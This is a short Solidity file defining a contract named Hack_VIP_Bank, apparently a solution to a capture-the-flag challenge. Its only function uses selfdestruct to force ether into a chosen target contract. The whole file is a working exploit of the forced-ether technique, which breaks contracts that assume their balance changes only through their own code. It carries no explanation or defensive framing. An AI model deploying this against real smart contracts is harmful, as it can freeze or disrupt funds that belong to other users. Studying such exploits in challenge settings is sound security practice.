// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract Hack_VIP_Bank {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function destroy() public payable {
        selfdestruct(payable(target));
    }
}
